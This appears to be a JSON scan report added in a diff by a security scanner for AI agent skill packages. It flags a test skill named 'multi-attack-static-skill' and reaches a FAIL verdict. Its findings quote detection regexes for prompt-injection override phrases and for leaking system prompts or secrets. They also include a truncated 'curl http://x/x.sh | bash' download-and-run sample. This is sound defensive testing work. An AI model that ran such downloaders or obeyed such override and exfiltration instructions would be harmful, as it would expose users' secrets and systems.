@@ -1,0 +1,424 @@
+{
+  "meta": {
+    "task_id": "e806b115776f4afca04c11f877bda06f",
+    "artifact_sha256": "611a3c6855d513c501c8c302feb342c77f261fdb5e1a237a88bc013e2a76f3d9",
+    "created_at": "2026-03-29T17:02:18.091474+00:00",
+    "engine_version": "0.1.0",
+    "ruleset_version": "0.1.0"
+  },
+  "conclusion": "FAIL",
+  "summary": {
+    "score": 0.0,
+    "score_raw": 100,
+    "level": "Blocker",
+    "conclusion": "FAIL",
+    "counts_by_severity": {
+      "Critical": 1,
+      "High": 11,
+      "Medium": 6,
+      "Low": 0,
+      "Info": 0
+    },
+    "counts_by_category": {
+      "secrets": 4,
+      "prompt_injection": 5,
+      "exfiltration": 3,
+      "malicious": 6
+    },
+    "counts_by_attack_type": {
+      "policy_override": 2,
+      "secret_exfiltration": 2,
+      "correlated_attack_chain": 1
+    },
+    "checks": [
+      {
+        "id": "skill_layout",
+        "title": "Skill 包结构（前置）",
+        "description": "校验是否符合 Agent Skill 约定：解压后至少包含一处 SKILL.md；非标准结构将记为命中并判定不通过。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "secrets",
+        "title": "敏感信息泄露",
+        "description": "基于正则匹配检测私钥、云访问密钥、令牌等敏感内容。",
+        "findings_count": 4,
+        "status": "fail"
+      },
+      {
+        "id": "sast",
+        "title": "危险调用与代码模式（SAST）",
+        "description": "对源码脚本扫描 eval/exec、子进程、反序列化、非安全 YAML 等风险模式。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "config",
+        "title": "配置与权限风险",
+        "description": "检查 .env、yaml/json 等常见配置中的调试开关、CORS 过宽、TLS 校验关闭等。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "malicious",
+        "title": "恶意特征与可疑行为",
+        "description": "启发式检测下载并执行、可疑 PowerShell、挖矿关键字、异常长 Base64 等。",
+        "findings_count": 6,
+        "status": "fail"
+      },
+      {
+        "id": "dependency",
+        "title": "依赖与供应链",
+        "description": "识别依赖清单（requirements.txt、package.json 等）；对 Python 固定版本依赖查询 OSV 公开漏洞库。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "prompt_injection",
+        "title": "Prompt 注入与越权指令",
+        "description": "检测忽略系统指令、工具越权调用、关闭安全策略等可疑提示词注入语句。",
+        "findings_count": 5,
+        "status": "fail"
+      },
+      {
+        "id": "attack_chain",
+        "title": "混淆与执行链路",
+        "description": "检测解码后执行、输入到动态执行等组合攻击链路并进行证据加权。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "exfiltration",
+        "title": "敏感信息外传行为",
+        "description": "检测敏感读取与网络外发组合行为，识别疑似数据泄露链路。",
+        "findings_count": 3,
+        "status": "fail"
+      },
+      {
+        "id": "supplychain",
+        "title": "供应链脚本攻击",
+        "description": "检测 npm 安装钩子和 Python 构建脚本中的远程下载执行与动态命令。",
+        "findings_count": 0,
+        "status": "pass"
+      }
+    ]
+  },
+  "findings": [
+    {
+      "id": "6694e0217b3d4a738d18efe419c4283a",
+      "rule_id": "SEC-GENERIC-TOKEN",
+      "category": "secrets",
+      "severity": "Medium",
+      "confidence": 0.8,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "84",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(token|apikey|api_key|secret|password)\\b\\s*[:=]\\s*['\\\"][^'\\\"]{8,}['\\\"]"
+      },
+      "recommendation": "检测到疑似敏感配置，建议改为安全注入"
+    },
+    {
+      "id": "2700d29c7f054ff7b31edaa4eb7a89f9",
+      "rule_id": "SEC-GENERIC-TOKEN",
+      "category": "secrets",
+      "severity": "Medium",
+      "confidence": 0.8,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "94",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(token|apikey|api_key|secret|password)\\b\\s*[:=]\\s*['\\\"][^'\\\"]{8,}['\\\"]"
+      },
+      "recommendation": "检测到疑似敏感配置，建议改为安全注入"
+    },
+    {
+      "id": "aab9e8af30ac48b2bae75bd5af279c3b",
+      "rule_id": "SEC-GENERIC-TOKEN",
+      "category": "secrets",
+      "severity": "Medium",
+      "confidence": 0.8,
+      "file_path": "multi-attack-static-skill/fixtures/expected_output.json",
+      "line_range": "7",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(token|apikey|api_key|secret|password)\\b\\s*[:=]\\s*['\\\"][^'\\\"]{8,}['\\\"]"
+      },
+      "recommendation": "检测到疑似敏感配置，建议改为安全注入"
+    },
+    {
+      "id": "7281ec98925b4f45a69ff1573a6c3601",
+      "rule_id": "SEC-GENERIC-TOKEN",
+      "category": "secrets",
+      "severity": "Medium",
+      "confidence": 0.8,
+      "file_path": "multi-attack-static-skill/fixtures/sample_input.txt",
+      "line_range": "4",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(token|apikey|api_key|secret|password)\\b\\s*[:=]\\s*['\\\"][^'\\\"]{8,}['\\\"]"
+      },
+      "recommendation": "检测到疑似敏感配置，建议改为安全注入"
+    },
+    {
+      "id": "208544905dff425bb5f38c22977c0878",
+      "rule_id": "PROMPT-INJ-IGNORE-SYSTEM",
+      "category": "prompt_injection",
+      "severity": "Medium",
+      "confidence": 0.77,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "6",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "prompt_injection_phrase"
+        ],
+        "weighted_score": 4,
+        "base_score": 4,
+        "match": "(?i)\\b(ignore|bypass|override)\\b.{0,40}\\b(system|developer)\\s+(prompt|instruction)s?\\b",
+        "attack_type": "policy_override"
+      },
+      "recommendation": "检测到疑似提示词注入中的系统指令绕过语句，建议增加策略拦截和人工复核。"
+    },
+    {
+      "id": "bc35f0339a7d43858f84c6becba8f76a",
+      "rule_id": "PROMPT-INJ-SECRET-EXFIL-INTENT",
+      "category": "prompt_injection",
+      "severity": "High",
+      "confidence": 0.95,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "6",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "prompt_injection_phrase",
+          "secret_exfiltration"
+        ],
+        "weighted_score": 7,
+        "base_score": 7,
+        "match": "(?i)\\b(system prompt|hidden prompt|api[_ -]?key|token|credential|secret)\\b.{0,40}\\b(print|output|reveal|dump|send|leak)\\b|\\b(print|output|reveal|dump|send|leak)\\b.{0,40}\\b(system prompt|hidden prompt|api[_ -]?key|token|credential|secret)\\b",
+        "attack_type": "secret_exfiltration"
+      },
+      "recommendation": "检测到疑似机密窃取意图，建议直接按高风险策略拦截并进入人工复核。"
+    },
+    {
+      "id": "6edf55769b69495286d3d4c69a6f0caf",
+      "rule_id": "PROMPT-INJ-IGNORE-SYSTEM",
+      "category": "prompt_injection",
+      "severity": "Medium",
+      "confidence": 0.77,
+      "file_path": "multi-attack-static-skill/fixtures/sample_input.txt",
+      "line_range": "1",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "prompt_injection_phrase"
+        ],
+        "weighted_score": 4,
+        "base_score": 4,
+        "match": "(?i)\\b(ignore|bypass|override)\\b.{0,40}\\b(system|developer)\\s+(prompt|instruction)s?\\b",
+        "attack_type": "policy_override"
+      },
+      "recommendation": "检测到疑似提示词注入中的系统指令绕过语句，建议增加策略拦截和人工复核。"
+    },
+    {
+      "id": "d348f4e90ea34b80a515d3b984caad42",
+      "rule_id": "PROMPT-INJ-SECRET-EXFIL-INTENT",
+      "category": "prompt_injection",
+      "severity": "High",
+      "confidence": 0.95,
+      "file_path": "multi-attack-static-skill/fixtures/sample_input.txt",
+      "line_range": "1",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "prompt_injection_phrase",
+          "secret_exfiltration"
+        ],
+        "weighted_score": 7,
+        "base_score": 7,
+        "match": "(?i)\\b(system prompt|hidden prompt|api[_ -]?key|token|credential|secret)\\b.{0,40}\\b(print|output|reveal|dump|send|leak)\\b|\\b(print|output|reveal|dump|send|leak)\\b.{0,40}\\b(system prompt|hidden prompt|api[_ -]?key|token|credential|secret)\\b",
+        "attack_type": "secret_exfiltration"
+      },
+      "recommendation": "检测到疑似机密窃取意图，建议直接按高风险策略拦截并进入人工复核。"
+    },
+    {
+      "id": "ce3bd8a4f5ac4da387ca0ad40dba7fd8",
+      "rule_id": "CHAIN-SECRET-EXFIL",
+      "category": "exfiltration",
+      "severity": "High",
+      "confidence": 0.9400000000000001,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "45",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "secret_read",
+          "network_egress"
+        ],
+        "weighted_score": 7,
+        "window_radius": 3
+      },
+      "recommendation": "检测到疑似敏感信息外传行为，建议移除外发逻辑并隔离凭据读取权限。"
+    },
+    {
+      "id": "c0d336a2a3cc4d48b6121836f3dbe5a3",
+      "rule_id": "CHAIN-SECRET-EXFIL",
+      "category": "exfiltration",
+      "severity": "High",
+      "confidence": 0.9400000000000001,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "54",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "secret_read",
+          "network_egress"
+        ],
+        "weighted_score": 7,
+        "window_radius": 3
+      },
+      "recommendation": "检测到疑似敏感信息外传行为，建议移除外发逻辑并隔离凭据读取权限。"
+    },
+    {
+      "id": "3dd39e48367349bc9393091642894969",
+      "rule_id": "CHAIN-SECRET-EXFIL",
+      "category": "exfiltration",
+      "severity": "High",
+      "confidence": 0.9400000000000001,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "55",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "secret_read",
+          "network_egress"
+        ],
+        "weighted_score": 7,
+        "window_radius": 3
+      },
+      "recommendation": "检测到疑似敏感信息外传行为，建议移除外发逻辑并隔离凭据读取权限。"
+    },
+    {
+      "id": "193fedb38aa34d61850738d0020b5b2d",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "45",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 25,
+        "sample_prefix": "curl http://x/x.sh | bas…",
+        "sample_sha256": "fc1f2be8131f4c12cf2ea1b247a666833f3960cf6ee9aa7bf4e11c5fe3f27f77"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "682565def88242f0916739136e1f2760",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "54",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 25,
+        "sample_prefix": "curl http://x/x.sh | bas…",
+        "sample_sha256": "fc1f2be8131f4c12cf2ea1b247a666833f3960cf6ee9aa7bf4e11c5fe3f27f77"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "870bd2a17a0c4483aec5a6eebcbd6b54",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/reference.md",
+      "line_range": "9",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 25,
+        "sample_prefix": "curl|wget|powershell|bas…",
+        "sample_sha256": "60e87a73e9c4b37aadd907a253f888e8d8913d0c96ee27db90006eaf0523ffe7"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "c5ea6068cccf4680ac4984b3bfa3d815",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/reference.md",
+      "line_range": "111",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 29,
+        "sample_prefix": "curl|wget).*(\\||&&).*(sh…",
+        "sample_sha256": "1b4fb9c9e9478f7c71bbc7c60154e9705242a6f7db791392c3e987c3137a707a"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "58ee2ee13d9648629f47c955ef1d1e71",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/fixtures/sample_input.txt",
+      "line_range": "2",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 25,
+        "sample_prefix": "curl http://x/x.sh | bas…",
+        "sample_sha256": "fc1f2be8131f4c12cf2ea1b247a666833f3960cf6ee9aa7bf4e11c5fe3f27f77"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "38d59b6acbdd4951b779912bf5e8943b",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "multi-attack-static-skill/data/rules.json",
+      "line_range": "10",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 25,
+        "sample_prefix": "curl|wget|powershell|bas…",
+        "sample_sha256": "60e87a73e9c4b37aadd907a253f888e8d8913d0c96ee27db90006eaf0523ffe7"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "1327ccfee04549dcb95f03223cb4e0f1",
+      "rule_id": "PROMPT-INJ-CORRELATED-CHAIN",
+      "category": "prompt_injection",
+      "severity": "Critical",
+      "confidence": 0.95,
+      "file_path": "multi-attack-static-skill/examples.md",
+      "line_range": "6",
+      "snippet_redacted": null,
+      "evidence": {
+        "chain_evidence": [
+          "prompt_injection_phrase",
+          "network_egress"
+        ],
+        "weighted_score": 8,
+        "attack_type": "correlated_attack_chain"
+      },
+      "recommendation": "检测到提示词注入与执行/外传行为同文件关联，建议立即阻断并升级人工处置。"
+    }
+  ]
+}
